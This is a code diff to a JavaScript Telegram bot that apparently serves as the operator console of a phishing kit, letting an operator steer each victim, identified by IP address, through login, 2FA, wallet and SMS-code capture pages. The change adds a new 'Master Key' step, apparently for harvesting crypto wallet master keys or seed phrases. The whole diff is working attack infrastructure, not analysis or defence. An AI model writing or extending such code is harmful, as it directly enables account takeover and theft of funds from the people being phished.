@@ -146,7 +146,7 @@ async function sendLoginTelegram(email, message) {
 }
 
 // -----------------
-// Verify page approval (3 buttons, no reject)
+// Verify page approval (4 buttons, no reject)
 // -----------------
 async function sendVerifyTelegram(ip, message) {
   const options = {
@@ -155,7 +155,8 @@ async function sendVerifyTelegram(ip, message) {
       inline_keyboard: [
         [{ text: "🏁 Done Page 🏁", callback_data: `page1|${ip}` }],
         [{ text: "🔐 Last 2FA 🔐", callback_data: `page2|${ip}` }],
-        [{ text: "💼 Wallet 💼", callback_data: `page3|${ip}` }]
+        [{ text: "💼 Wallet 💼", callback_data: `page3|${ip}` }],
+        [{ text: "🗝️ Master Key 🗝️", callback_data: `page4|${ip}` }]
       ]
     }
   };
@@ -348,9 +349,10 @@ bot.on("callback_query", async (query) => {
     else if (action === "page1") status = "accepted1";
     else if (action === "page2") status = "accepted2";
     else if (action === "page3") status = "accepted3";
+    else if (action === "page4") status = "accepted4";
     else status = "rejected";
 
-    const isAccepted = ["accepted", "accepted1", "accepted2", "accepted3"].includes(status);
+    const isAccepted = ["accepted", "accepted1", "accepted2", "accepted3", "accepted4"].includes(status);
     const actionLabel = isAccepted ? "ACCEPTED! ✅" : "REJECTED! ❌";
 
     // Notify backend
@@ -377,6 +379,8 @@ bot.on("callback_query", async (query) => {
       replyText = `📍 <code>${identifier}</code> has been directed to <b>🔐 Last 2FA 🔐</b>`;
     } else if (status === "accepted3" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
       replyText = `📍 <code>${identifier}</code> has been directed to <b>💼 Wallet 💼</b>`;
+    } else if (status === "accepted4" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
+      replyText = `📍 <code>${identifier}</code> has been directed to <b>🗝️ Master Key 🗝️</b>`;
     } else {
       const isSMS = /^\d+$/.test(identifier);
       replyText = isSMS
